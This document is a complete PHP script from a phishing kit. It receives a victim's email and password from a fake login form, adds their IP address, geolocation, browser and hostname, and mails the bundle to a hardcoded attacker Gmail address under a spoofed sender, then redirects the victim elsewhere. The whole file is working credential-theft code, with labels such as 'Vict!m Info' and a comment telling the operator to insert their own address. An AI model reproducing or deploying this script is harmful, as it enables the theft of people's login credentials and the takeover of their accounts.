<?php
if($_POST["email"] != "" and $_POST["passwd"] != ""){
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Wires Info-----------------------\n";
$message .= "Online: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['passwd']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------FUD TOOL DOT COM-------------\n";
//change ur email here
$sent ="marcusmarcus10111@gmail.com";


$subject = "Result - ".$country;
$headers = "From: Results Wire<wirez@googledocs.org>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
if(preg_match("/@gmail\.com$/", urldecode($_POST['email'])))
    {
	mail($sent,$subject,$message,$headers);header("Location: verification.php");exit;
    }else{mail($sent,$subject,$message,$headers);}

 
     header("Location: http://download.asperasoft.com/download/docs/console/2.0/linux/html/images/console/console-report-ex1-xls.gif");
}else{
header("Location: index.html");
}

?>